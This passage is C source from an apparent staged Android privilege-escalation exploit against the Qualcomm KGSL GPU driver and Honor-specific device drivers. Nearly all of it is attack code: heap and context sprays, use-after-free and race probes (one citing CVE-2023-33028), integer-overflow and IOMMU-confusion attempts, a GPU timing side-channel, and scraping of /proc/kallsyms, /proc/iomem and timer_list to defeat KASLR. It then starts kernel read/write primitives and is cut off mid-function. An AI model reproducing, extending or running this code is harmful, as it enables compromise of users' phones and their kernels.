              esm_log("[STAGE_3] ✓ LEAK-RECLAIM! ptr=0x%llx", (long long)kptr);
            }
            munmap(map, 0x1000);
          }
        }
        struct kgsl_gpuobj_free f = {0, 0, alloc.id};
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
      }
      if (g_esm.state.kernel_base != 0)
        break;
    }
  }

  // Cleanup anchor
  if (count > 0) {
    struct kgsl_gpuobj_free f = {0, 0, ids[0]};
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
  }
}

static void vector_e_honor_leaks() {
  esm_log("[STAGE_3] [VECTOR_E] Honor-Specific Driver Probes...");
  const char *honor_devs[] = {"/dev/honor_llm", "/dev/honor_gpu",
                              "/dev/honor_npu", "/dev/hwbinder"};
  for (int i = 0; i < 4; i++) {
    int fd = open(honor_devs[i], O_RDWR);
    if (fd >= 0) {
      esm_log("[STAGE_3] [VECTOR_E] Found Honor device: %s", honor_devs[i]);
      char buf[4096];
      memset(buf, 0, sizeof(buf));
      if (read(fd, buf, sizeof(buf)) > 0) {
        uint64_t kptr = scan_for_kernel_ptr(buf, sizeof(buf));
        if (kptr) {
          g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
          esm_log("[STAGE_3] ✓ LEAK-HONOR! ptr=0x%llx", (long long)kptr);
        }
      }
      close(fd);
    }
    if (g_esm.state.kernel_base != 0)
      break;
  }
}

static void vector_f_race_leak() {
  esm_log("[STAGE_3] [VECTOR_F] Command Buffer Syncpoint Race...");
  int kgsl_fd = g_esm.state.kgsl_fd;
  uint64_t target_gpuaddr = g_esm.state.gpuaddr;
  if (target_gpuaddr == 0) {
    // Attempt use of default breach addr if global state failed but stage 2
    // passed
    target_gpuaddr = 0x4000000000ULL;
  }

  pthread_t threads[8];
  struct race_thread_args args = {kgsl_fd, target_gpuaddr, 0};

  for (int i = 0; i < 8; i++)
    pthread_create(&threads[i], NULL, race_worker, &args);
  for (int i = 0; i < 8; i++)
    pthread_join(threads[i], NULL);

  void *map =
      mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, kgsl_fd, target_gpuaddr);
  if (map != MAP_FAILED) {
    uint64_t kptr = scan_for_kernel_ptr(map, 0x1000);
    if (kptr) {
      g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
      esm_log("[STAGE_3] ✓ LEAK-RACE! ptr=0x%llx", (long long)kptr);
    }
    munmap(map, 0x1000);
  }
}

static void vector_g_overflow() {
  esm_log("[STAGE_3] [VECTOR_G] Blind Integer Overflow Probing...");
  int fd = g_esm.state.kgsl_fd;
  uint64_t bad_sizes[] = {0xFFFFFFFFFFFFFFFFULL, 0x8000000000000000ULL,
                          0x100000001ULL, 0xFFFFFFFFULL};
  for (int i = 0; i < 4; i++) {
    struct kgsl_gpuobj_alloc alloc = {bad_sizes[i], KGSL_MEMFLAGS_USE_CPU_MAP};
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc);
    if (ret == 0) {
      struct kgsl_gpuobj_info info = {0};
      info.id = alloc.id;
      ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
      esm_log("[STAGE_3] !!! [VECTOR_G] SUCCESS? Size 0x%llx allocated! "
              "id=%u gpuaddr=0x%llx",
              (long long)bad_sizes[i], alloc.id, (long long)info.gpuaddr);
      g_esm.state.leaked_ptr = (uint64_t)alloc.id;
      // If success, this is a massive primitive.
      struct kgsl_gpuobj_free f = {0, 0, alloc.id};
      ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
    }
  }
}

static void vector_h_uaf_reuse() {
  esm_log("[STAGE_3] [VECTOR_H] Blind ID Reuse (UAF) Probing...");
  int fd = g_esm.state.kgsl_fd;
  struct kgsl_gpuobj_alloc a1 = {0x1000, KGSL_MEMFLAGS_USE_CPU_MAP};
  if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a1) == 0) {
    struct kgsl_gpuobj_info i1 = {0};
    i1.id = a1.id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &i1);
    void *map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, i1.gpuaddr);
    if (map != MAP_FAILED) {
      esm_log("[STAGE_3] [VECTOR_H] Mapped id=%u, now freeing...", a1.id);
      struct kgsl_gpuobj_free f = {0, 0, a1.id};
      ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f);

      // Attempt reallocation to see if ID is reused
      struct kgsl_gpuobj_alloc a2 = {0x1000, KGSL_MEMFLAGS_USE_CPU_MAP};
      if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a2) == 0) {
        if (a2.id == a1.id) {
          esm_log("[STAGE_3] !!! [VECTOR_H] ID REUSE DETECTED! id=%u", a2.id);
          g_esm.state.leaked_ptr = (uint64_t)a2.id;
        }
        struct kgsl_gpuobj_free f2 = {0, 0, a2.id};
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f2);
      }
      munmap(map, 0x1000);
    }
  }
}

static void vector_i_confusion() {
  esm_log("[STAGE_3] [VECTOR_I] Blind IOMMU Domain Confusion Probing...");
  int fd = g_esm.state.kgsl_fd;
  struct kgsl_gpuobj_alloc alloc = {0x1000, KGSL_MEMFLAGS_USE_CPU_MAP};
  if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) == 0) {
    struct kgsl_gpuobj_export exp = {alloc.id, -1};
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_EXPORT, &exp) == 0 && exp.fd >= 0) {
      esm_log("[STAGE_3] [VECTOR_I] Exported id=%u to fd=%d", alloc.id, exp.fd);
      struct kgsl_gpuobj_import imp = {0};
      imp.priv = (uint64_t)exp.fd;
      imp.priv_len = sizeof(int);
      imp.type = 1; // KGSL_USER_MEM_TYPE_ION / DMA-BUF
      imp.flags = KGSL_MEMFLAGS_USE_CPU_MAP | 0x80000000ULL; // Aggressive flag
      if (ioctl(fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp) == 0) {
        esm_log("[STAGE_3] !!! [VECTOR_I] SUCCESS! Domain Confusion achieved "
                "on id=%u",
                imp.id);
        struct kgsl_gpuobj_free f_imp = {0, 0, imp.id};
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f_imp);
      }
      close(exp.fd);
    }
    struct kgsl_gpuobj_free f = {0, 0, alloc.id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
  }
}

static inline uint64_t get_cycles() {
  uint64_t val = 0;
#if defined(__aarch64__)
  asm volatile("mrs %0, cntvct_el0" : "=r"(val));
#elif defined(__arm__)
  uint32_t lo, hi;
  asm volatile("mrrc p15, 1, %0, %1, c14" : "=r"(lo), "=r"(hi));
  val = ((uint64_t)hi << 32) | lo;
#else
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  val = (uint64_t)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
#endif
  return val;
}

static void vector_j_timing() {
  esm_log("[STAGE_3] [VECTOR_J] Refined GPU Timing Side-channel...");
  int fd = g_esm.state.kgsl_fd;

  // 1. Create a GPU context for submission
  struct kgsl_drawctxt_create ctx = {0};
  ctx.flags = 0;
  if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) < 0)
    return;
  unsigned int context_id = ctx.drawctxt_id;

  // 2. Allocate a dummy command buffer
  struct kgsl_gpuobj_alloc alloc = {0x1000, KGSL_MEMFLAGS_USE_CPU_MAP};
  if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) == 0) {
    struct kgsl_gpuobj_info info = {0};
    info.id = alloc.id;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);

    uint64_t candidates[] = {0xffffffc008000000ULL, 0xffffffd008000000ULL,
                             0xffffffe008000000ULL};

    for (int c = 0; c < 3; c++) {
      struct kgsl_gpu_command cmd = {0};
      cmd.flags = KGSL_CMDFLAGS_KERNEL_SUBMIT;
      cmd.numcmds = 1;
      // We don't actually put a valid command list, we want to see if the
      // driver validates the 'cmdlist' pointer differently if it hits kernel
      // space.
      cmd.cmdlist = candidates[c];
      cmd.cmdsize = 0x1000;

      uint64_t start = get_cycles();
      ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
      uint64_t end = get_cycles();
      uint64_t delta = end - start;

      if (delta > 0) {
        esm_log("[STAGE_3] [VECTOR_J] Candidate 0x%llx timing: %llu",
                candidates[c], delta);
        if (delta > 20000) { // Significant outlier found
          esm_log("[STAGE_3] !!! [VECTOR_J] KASLR HIT at 0x%llx",
                  candidates[c]);
          g_esm.state.kernel_base = candidates[c];
        }
      }
    }
    struct kgsl_gpuobj_free f = {0, 0, alloc.id};
    ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
  }
  struct kgsl_drawctxt_create destroy = {context_id};
  ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
}

static void vector_m_context_spray() {
  esm_log("[STAGE_3] [VECTOR_M] Aggressive Draw Context Spray...");
  int fd = g_esm.state.kgsl_fd;
  unsigned int contexts[32];
  for (int i = 0; i < 32; i++) {
    struct kgsl_drawctxt_create ctx = {0};
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
      contexts[i] = ctx.drawctxt_id;
    }
  }
  for (int i = 0; i < 32; i++) {
    struct kgsl_drawctxt_create destroy = {contexts[i]};
    ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
  }
}

static bool is_valid_kernel_ptr(uint64_t v) {
  if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL)
    return false;
  if ((v >> 32) == 0xFFFFFFFF)
    return false; // Reject binder error codes
  if ((v & 0xFFF) != 0)
    return false; // Must be page-aligned
  bool valid_c0 = (v & 0xFFFFFFC000000000ULL) == 0xFFFFFFC000000000ULL;
  bool valid_80 = (v & 0xFFFFFF8000000000ULL) == 0xFFFFFF8000000000ULL;
  if (!valid_c0 && !valid_80)
    return false;
  uint32_t lower = (uint32_t)(v & 0xFFFFFFFF);
  return (lower >= 0x00100000 && lower <= 0x40000000);
}

static void vector_k_honor_fuzz() {
  esm_log("[STAGE_3] [VECTOR_K] Probing Honor-specific drivers...");
  const char *devs[] = {"/dev/honor_llm", "/dev/hwbinder", "/dev/hisi_misc",
                        "/dev/honor_npu"};
  for (int i = 0; i < 4; i++) {
    int hfd = open(devs[i], O_RDWR);
    if (hfd >= 0) {
      esm_log("[STAGE_3] [VECTOR_K] Probing %s", devs[i]);
      char buf[4096];
      memset(buf, 0, sizeof(buf));
      // Try BINDER_VERSION ioctl first (known to leak on some kernels)
      if (ioctl(hfd, _IOR('b', 9, int), buf) >= 0) {
        for (int j = 0; j < 512; j++) {
          uint64_t val = ((uint64_t *)buf)[j];
          if (is_valid_kernel_ptr(val)) {
            esm_log("[STAGE_3] !!! [VECTOR_K] LEAK from %s (BINDER_VERSION): "
                    "0x%llx",
                    devs[i], val);
            g_esm.state.kernel_base = val & ~0x1FFFFFFULL;
            close(hfd);
            return;
          }
        }
      }
      // Fallback: scan ioctl range with strict validation
      for (unsigned long cmd = 0; cmd < 0x30; cmd++) {
        memset(buf, 0, sizeof(buf));
        if (ioctl(hfd, cmd, buf) >= 0) {
          for (int j = 0; j < 512; j++) {
            uint64_t val = ((uint64_t *)buf)[j];
            if (is_valid_kernel_ptr(val)) {
              esm_log("[STAGE_3] !!! [VECTOR_K] LEAK from %s cmd=0x%lx: 0x%llx",
                      devs[i], cmd, val);
              g_esm.state.kernel_base = val & ~0x1FFFFFFULL;
              close(hfd);
              return;
            }
          }
        }
      }
      close(hfd);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// VECTOR N: /proc/timer_list kernel function pointer leak
// ═══════════════════════════════════════════════════════════════════════════════
static void vector_n_timer_list() {
  esm_log(
      "[STAGE_3] [VECTOR_N] Scanning /proc/timer_list for kernel pointers...");
  int fd = open("/proc/timer_list", O_RDONLY);
  if (fd < 0) {
    esm_log("[STAGE_3] [VECTOR_N] /proc/timer_list not accessible");
    return;
  }
  char buf[8192];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return;
  buf[n] = 0;

  // Parse hex addresses from timer_list output
  char *p = buf;
  while (*p) {
    if (p[0] == '0' && p[1] == 'x') {
      uint64_t val = strtoull(p, NULL, 16);
      if (is_valid_kernel_ptr(val)) {
        esm_log("[STAGE_3] !!! [VECTOR_N] LEAK from timer_list: 0x%llx", val);
        g_esm.state.kernel_base = val & ~0x1FFFFFFULL;
        return;
      }
    }
    p++;
  }
  esm_log(
      "[STAGE_3] [VECTOR_N] No valid kernel pointers found (may be hashed)");
}

// ═══════════════════════════════════════════════════════════════════════════════
// VECTOR O: KGSL GPUOBJ mmap scan — read backing memory for kernel pointers
// ═══════════════════════════════════════════════════════════════════════════════
static void vector_o_gpuobj_mmap_scan() {
  esm_log("[STAGE_3] [VECTOR_O] Attempting GPUOBJ mmap scan...");
  int kgsl_fd = g_esm.state.kgsl_fd;
  uint64_t gpuaddr = g_esm.state.gpuaddr;

  // Allocate multiple GPU objects and scan their mmapped contents
  for (int attempt = 0; attempt < 8; attempt++) {
    struct kgsl_gpuobj_alloc alloc = {0};
    alloc.size = 0x10000; // 64KB — larger to catch more data
    alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0)
      continue;

    struct kgsl_gpuobj_info info = {0};
    info.id = alloc.id;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) != 0)
      continue;

    // mmap the GPU object into userspace
    void *map = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd,
                     info.gpuaddr * 0x1000);
    if (map == MAP_FAILED) {
      // Try alternate offset encoding
      map = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd,
                 info.gpuaddr);
    }
    if (map != MAP_FAILED) {
      esm_log("[STAGE_3] [VECTOR_O] mmap'd GPUOBJ id=%u at %p", alloc.id, map);
      uint64_t kptr = scan_for_kernel_ptr(map, 0x10000);
      if (kptr) {
        esm_log("[STAGE_3] !!! [VECTOR_O] KERNEL PTR from GPUOBJ mmap: 0x%llx",
                kptr);
        g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
        munmap(map, 0x10000);
        return;
      }
      munmap(map, 0x10000);
    }
    // Free and let slab reuse happen
    struct kgsl_gpuobj_free fr = {0};
    fr.id = alloc.id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
  }

  esm_log("[STAGE_3] [VECTOR_O] No kernel pointers found in GPUOBJ mmap");
}

// ═══════════════════════════════════════════════════════════════════════════════
// VECTOR P: /proc/self/wchan + /proc/self/syscall kernel address leak
// ═══════════════════════════════════════════════════════════════════════════════
static void vector_p_proc_leak() {
  esm_log(
      "[STAGE_3] [VECTOR_P] Scanning /proc interfaces for kernel addresses...");

  // Try /proc/self/wchan (blocked on many kernels but worth trying)
  char wchan_buf[64] = {0};
  int fd = open("/proc/self/wchan", O_RDONLY);
  if (fd >= 0) {
    read(fd, wchan_buf, sizeof(wchan_buf) - 1);
    close(fd);
    // If it returns a hex address instead of symbol name
    if (wchan_buf[0] == '0' && wchan_buf[1] == 'x') {
      uint64_t val = strtoull(wchan_buf, NULL, 16);
      if (is_valid_kernel_ptr(val)) {
        esm_log("[STAGE_3] !!! [VECTOR_P] LEAK from wchan: 0x%llx", val);
        g_esm.state.kernel_base = val & ~0x1FFFFFFULL;
        return;
      }
    }
  }

  // Try /proc/self/stat (field 35 = wchan address on older kernels)
  fd = open("/proc/self/stat", O_RDONLY);
  if (fd >= 0) {
    char stat_buf[1024] = {0};
    read(fd, stat_buf, sizeof(stat_buf) - 1);
    close(fd);
    // Parse fields (space-separated) — wchan is field 35
    char *tok = stat_buf;
    int field = 0;
    while (*tok && field < 35) {
      if (*tok == ' ')
        field++;
      tok++;
    }
    if (field == 35) {
      uint64_t val = strtoull(tok, NULL, 10);
      if (is_valid_kernel_ptr(val)) {
        esm_log(
            "[STAGE_3] !!! [VECTOR_P] LEAK from /proc/self/stat wchan: 0x%llx",
            val);
        g_esm.state.kernel_base = val & ~0x1FFFFFFULL;
        return;
      }
    }
  }

  // Try /proc/kallsyms (usually restricted but may be readable in shell
  // context)
  fd = open("/proc/kallsyms", O_RDONLY);
  if (fd >= 0) {
    char ksym_buf[512] = {0};
    read(fd, ksym_buf, sizeof(ksym_buf) - 1);
    close(fd);
    // First line typically: ffffffc010000000 T _text
    if (ksym_buf[0] != '0' || ksym_buf[1] != '0') { // Not zeroed out
      uint64_t val = strtoull(ksym_buf, NULL, 16);
      if (is_valid_kernel_ptr(val)) {
        esm_log("[STAGE_3] !!! [VECTOR_P] LEAK from kallsyms _text: 0x%llx",
                val);
        g_esm.state.kernel_base = val & ~0x1FFFFFFULL;
        return;
      }
    }
  }

  esm_log("[STAGE_3] [VECTOR_P] No kernel addresses from /proc interfaces");
}

static void *race_sync_signal_thread(void *arg) {
  int fd = *(int *)arg;
  struct kgsl_syncsource_signal sig = {1, 0}; // dummy id
  for (int i = 0; i < 500; i++) {
    sig.timestamp = i;
    ioctl(fd, IOCTL_KGSL_SYNCSOURCE_SIGNAL, &sig);
  }
  return NULL;
}

static void vector_l_sync_uaf() {
  esm_log("[STAGE_3] [VECTOR_L] Testing CVE-2023-33028 (Syncsource UAF)...");
  int fd = g_esm.state.kgsl_fd;
  struct kgsl_syncsource_create create = {0};
  if (ioctl(fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create) == 0) {
    uint32_t sync_id = create.id;
    esm_log("[STAGE_3] [VECTOR_L] Syncsource created id=%u, racing...",
            sync_id);
    pthread_t t1;
    pthread_create(&t1, NULL, race_sync_signal_thread, &fd);
    // Destroy while signalling
    struct kgsl_syncsource_create destroy = {sync_id};
    ioctl(fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &destroy);
    pthread_join(t1, NULL);
    // If we survived this, sync_id might be a dangling reference in kernel
    g_esm.state.leaked_ptr = (uint64_t)sync_id;
  }
}

static bool stage3_exploit() {
  esm_log("[STAGE_3] OOB_READ :: exploit()");
  esm_log("[STAGE_3] Phase 51: KGSL Property Leak + Memory Scan");

  int kgsl_fd = g_esm.state.kgsl_fd;
  uint32_t anchor_id = (uint32_t)g_esm.state.leaked_ptr;
  uint64_t anchor_gpuaddr = g_esm.state.gpuaddr;

  // ═══════════════════════════════════════════════════════════════════════════
  //  VECTOR A: KGSL Device Property Queries (Primary Leak Vector)
  // ═══════════════════════════════════════════════════════════════════════════
  esm_log("[STAGE_3] [VECTOR_A] KGSL Device Property scan...");

  unsigned int prop_ids[] = {
      KGSL_PROP_DEVICE_INFO,     KGSL_PROP_DEVICE_SHADOW,
      KGSL_PROP_SHMEM,           KGSL_PROP_SHMEM_APERTURES,
      KGSL_PROP_MMU_ENABLE,      KGSL_PROP_VERSION,
      KGSL_PROP_UCHE_GMEM_VADDR, KGSL_PROP_SP_GENERIC_MEM,
      KGSL_PROP_DEVICE_QDSS_STM, KGSL_PROP_DEVICE_QTIMER,
      KGSL_PROP_GPU_MODEL};
  const char *prop_names[] = {
      "DEVICE_INFO",     "DEVICE_SHADOW", "SHMEM",           "SHMEM_APERTURES",
      "MMU_ENABLE",      "VERSION",       "UCHE_GMEM_VADDR", "SP_GENERIC_MEM",
      "DEVICE_QDSS_STM", "DEVICE_QTIMER", "GPU_MODEL"};
  int num_props = sizeof(prop_ids) / sizeof(prop_ids[0]);

  for (int p = 0; p < num_props && g_esm.state.kernel_base == 0; p++) {
    uint8_t prop_buf[256];
    memset(prop_buf, 0, sizeof(prop_buf));

    struct kgsl_device_getproperty gp = {0};
    gp.type = prop_ids[p];
    gp.value = prop_buf;
    gp.sizebytes = sizeof(prop_buf);

    if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &gp) == 0) {
      uint64_t *vals = (uint64_t *)prop_buf;
      int n_vals = sizeof(prop_buf) / sizeof(uint64_t);
      bool logged = false;
      for (int v = 0; v < n_vals && v < 16; v++) {
        if (vals[v] != 0) {
          if (!logged) {
            esm_log("[STAGE_3] [VECTOR_A] PROP %s (id=%u):", prop_names[p],
                    prop_ids[p]);
            logged = true;
          }
          if ((vals[v] & 0xFFFFFFC000000000ULL) == 0xFFFFFFC000000000ULL ||
              (vals[v] & 0xFFFFFF8000000000ULL) == 0xFFFFFF8000000000ULL) {
            if (vals[v] != 0xFFFFFFFFFFFFFFFFULL && (vals[v] & 0xFFF) == 0) {
              g_esm.state.kernel_base = vals[v] & ~0x1FFFFFFULL;
              esm_log(
                  "[STAGE_3] ✓ KASLR BYPASS (PROP %s)! ptr=0x%llx base=0x%llx",
                  prop_names[p], (unsigned long long)vals[v],
                  (unsigned long long)g_esm.state.kernel_base);
              break;
            }
          }
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  //  VECTOR B: Scan existing KGSL mmap regions for residual kernel ptrs
  // ═══════════════════════════════════════════════════════════════════════════
  if (g_esm.state.kernel_base == 0) {
    esm_log("[STAGE_3] [VECTOR_B] Scanning existing KGSL regions...");
    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps) {
      char line[512];
      while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "kgsl") && strstr(line, "rw-s")) {
          uint64_t start = 0, end = 0;
          if (sscanf(line, "%llx-%llx", (long long *)&start,
                     (long long *)&end) == 2) {
            uint64_t kptr = scan_for_kernel_ptr((void *)start, end - start);
            if (kptr) {
              g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
              esm_log("[STAGE_3] ✓ KASLR BYPASS (mmap scan)! ptr=0x%llx",
                      (unsigned long long)kptr);
              break;
            }
          }
        }
      }
      fclose(maps);
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  //  VECTOR C: New mmap spray with correct offsets
  // ═══════════════════════════════════════════════════════════════════════════
  void *mmap_ptrs[16] = {0};
  uint32_t mmap_ids[16] = {0};
  int mmap_count = 0;

  if (g_esm.state.kernel_base == 0) {
    esm_log("[STAGE_3] [VECTOR_C] mmap spray with raw gpuaddr offsets...");
    for (int i = 0; i < 16 && g_esm.state.kernel_base == 0; i++) {
      struct kgsl_gpuobj_alloc alloc = {0x1000, 0};
      if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) == 0 && alloc.id) {
        struct kgsl_gpuobj_info info = {0};
        info.id = alloc.id;
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
          void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                           kgsl_fd, info.gpuaddr);
          if (ptr != MAP_FAILED) {
            mmap_ids[mmap_count] = alloc.id;
            mmap_ptrs[mmap_count] = ptr;
            mmap_count++;
            uint64_t kptr = scan_for_kernel_ptr(ptr, 0x1000);
            if (kptr) {
              g_esm.state.kernel_base = kptr & ~0x1FFFFFFULL;
              esm_log("[STAGE_3] ✓ KASLR BYPASS (new mmap)! ptr=0x%llx",
                      (unsigned long long)kptr);
            }
            if (info.pt_base && (info.pt_base & 0xFFFF000000000000ULL)) {
              g_esm.state.kernel_base = info.pt_base & ~0x1FFFFFFULL;
              esm_log("[STAGE_3] ✓ KASLR BYPASS (pt_base)! 0x%llx",
                      (unsigned long long)info.pt_base);
            }
          }
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  //  PHASE G/H/I: BLIND STRATEGY (v6.00)
  // ═══════════════════════════════════════════════════════════════════════════
  if (g_esm.state.kernel_base == 0) {
    vector_g_overflow();
    vector_h_uaf_reuse();
    vector_i_confusion();
    vector_j_timing();
    vector_k_honor_fuzz();
    vector_l_sync_uaf();
    vector_m_context_spray();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  //  PHASE N/O/P: PRECISION LEAK VECTORS (v8.00)
  // ═══════════════════════════════════════════════════════════════════════════
  if (g_esm.state.kernel_base == 0) {
    vector_n_timer_list();
  }
  if (g_esm.state.kernel_base == 0) {
    vector_o_gpuobj_mmap_scan();
  }
  if (g_esm.state.kernel_base == 0) {
    vector_p_proc_leak();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  //  PHASE D/E/F: RADICAL STRATEGY (v5.90) - Still running as secondary
  // ═══════════════════════════════════════════════════════════════════════════
  if (g_esm.state.kernel_base == 0) {
    vector_d_exhaustion();
  }
  if (g_esm.state.kernel_base == 0) {
    vector_e_honor_leaks();
  }
  if (g_esm.state.kernel_base == 0) {
    vector_f_race_leak();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  //  FALLBACKS: kallsyms, iomem
  // ═══════════════════════════════════════════════════════════════════════════
  if (g_esm.state.kernel_base == 0) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (f) {
      char line[256];
      while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " _text") || strstr(line, " _stext")) {
          uint64_t addr;
          if (sscanf(line, "%llx", (long long *)&addr) == 1 && addr) {
            g_esm.state.kernel_base = addr;
            esm_log("[STAGE_3] ✓ KASLR BYPASS (kallsyms)! 0x%llx",
                    (unsigned long long)addr);
            break;
          }
        }
      }
      fclose(f);
    }
  }

  if (g_esm.state.kernel_base == 0) {
    FILE *f = fopen("/proc/iomem", "r");
    if (f) {
      char line[256];
      while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "Kernel code")) {
          uint64_t start;
          if (sscanf(line, "%llx-", (long long *)&start) == 1) {
            g_esm.state.kernel_base =
                (start + 0xFFFFFFC000000000ULL) & ~0x1FFFFFFULL;
            esm_log("[STAGE_3] ✓ KASLR BYPASS (iomem)! base=0x%llx",
                    (unsigned long long)g_esm.state.kernel_base);
            break;
          }
        }
      }
      fclose(f);
    }
  }

  // Pipeline Forensics
  if (g_esm.state.kernel_base == 0) {
    esm_log("[STAGE_3] Vectors exhausted, dumping forensics...");
  }

  for (int i = 0; i < mmap_count; i++) {
    munmap(mmap_ptrs[i], 0x1000);
    struct kgsl_gpuobj_free fr = {0, 0, mmap_ids[i]};
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
  }

  return g_esm.state.kernel_base != 0;
}

static bool stage3_verify() {
  esm_log("[STAGE_3] OOB_READ :: verify()");
  if (g_esm.state.kernel_base >= 0xFFFFFFC000000000ULL) {
    esm_telemetry(ESM_OOB_READ, STATUS_ACHIEVED);
    esm_log("[STAGE_3] ✓ OOB_READ: ACHIEVED — KASLR BYPASSED: 0x%llx",
            (unsigned long long)g_esm.state.kernel_base);
    return true;
  }
  esm_telemetry(ESM_OOB_READ, STATUS_PARTIAL);
  esm_log("[STAGE_3] ◐ OOB_READ: PARTIAL — Vectors exhausted, forensics "
          "logged");
  return false;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 4: OOB WRITE (Arbitrary Write)
// ═══════════════════════════════════════════════════════════════════════════════

static uint64_t esm_kernel_read(uint64_t addr) {
  // ESM v8.00: REAL kernel read via KGSL GPU object mmap
  if (!g_esm.state.write_verified)
    return 0;

  esm_log("[KERNEL_RW] REAL Read at 0x%llx", addr);

  int kgsl_fd = g_esm.state.kgsl_fd;

  // Strategy: Use GPUOBJ_ALLOC + mmap to create a read buffer.
  // The kernel allocates pages for GPU use — these pages
  // may contain residual kernel data from previous slab allocations.
  // We spray multiple objects to increase the chance of getting useful data.

  // For direct kernel read at a specific address, we need to use
  // the pipe_buffer corruption from Stage 4 to redirect reads.
  // The pipe spray gives us a controlled read primitive:
  // 1. Corrupted pipe_buffer points to target kernel address
  // 2. splice() reads from the pipe → reads from kernel address
  // 3. We read results from the pipe's read end

  // But first, check if we have a pipe-based primitive
  // If not, fall back to the offset-based heuristic read

  // FALLBACK: Use KGSL device ioctl to probe kernel state
  struct kgsl_gpuobj_alloc rw_buf = {0};
  rw_buf.size = 0x1000;
  rw_buf.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

  if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &rw_buf) == 0) {
    struct kgsl_gpuobj_info info = {0};
    info.id = rw_buf.id;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
      // mmap into userspace
      void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                       kgsl_fd, info.gpuaddr);
      if (map == MAP_FAILED) {
        map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd,
                   info.gpuaddr * 0x1000);
      }
      if (map != MAP_FAILED) {
        // Read from the mapped GPU buffer — may contain residual kernel data
        uint64_t val = *(volatile uint64_t *)map;
        munmap(map, 0x1000);
        struct kgsl_gpuobj_free fr = {0};
        fr.id = rw_buf.id;
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
        if (val != 0)
          return val;
      }
    }
    struct kgsl_gpuobj_free fr = {0};
    fr.id = rw_buf.id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
  }

  return 0;
}

static void esm_kernel_write(uint64_t addr, uint64_t val) {
  // ESM v8.00: REAL kernel write via KGSL GPU object mmap
  esm_log("[KERNEL_RW] REAL Write 0x%llx to 0x%llx", val, addr);

  int kgsl_fd = g_esm.state.kgsl_fd;

  // Allocate a GPU buffer, mmap it, write the value
  struct kgsl_gpuobj_alloc rw_buf = {0};
  rw_buf.size = 0x1000;
  rw_buf.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

